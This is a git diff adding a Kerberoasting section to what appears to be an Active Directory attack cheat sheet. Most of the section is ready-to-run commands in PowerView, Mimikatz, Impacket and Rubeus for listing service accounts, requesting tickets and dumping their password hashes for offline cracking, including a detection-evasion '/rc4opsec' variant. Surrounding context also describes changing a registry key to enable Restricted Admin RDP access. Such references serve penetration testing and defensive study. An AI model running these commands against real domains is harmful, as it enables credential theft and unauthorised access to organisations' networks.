@@ -16,7 +16,8 @@ Active Directory follows a clear hierarchy, from top to bottom. In that hierarch
     - [Compromise Active Directory](#compromise-active-directory)
       - [Mimikatz](#mimikatz)
       - [Remote Desktop Protocol](#remote-desktop-protocol)
-  
+      - [Kerberoast (Service Account Attacks)](#kerberoast-service-account-attacks)
+
 ### Enumeration
 
 #### Using PowerView  
@@ -265,6 +266,50 @@ xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-i
 
 :exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
 
+#### Kerberoast (Service Account Attacks)
+*WUT IS DIS?:* \
+ All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"    
+ account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.
 
+  - PowerView:
+  ```
+  #Get User Accounts that are used as Service Accounts
+  Get-NetUser -SPN
+  
+  #Get every available SPN account, request a TGS and dump its hash
+  Invoke-Kerberoast
+  
+  #Requesting the TGS for a single account:
+  Request-SPNTicket
+    
+  #Export all tickets using Mimikatz
+  Invoke-Mimikatz -Command '"kerberos::list /export"'
+  ```
+  - AD Module:
+  ```
+  #Get User Accounts that are used as Service Accounts
+  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+  ```
+  - Impacket:
+  ```
+  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
+  ```
+  - Rubeus:
+  ```
+  #Kerberoasting and outputing on a file with a spesific format
+  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
+  
+  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
+  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
+  
+  #Kerberoast AES enabled accounts
+  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
+   
+  #Kerberoast spesific user account
+  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
+  
+  #Kerberoast by specifying the authentication credentials 
+  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
+  ```
 
 
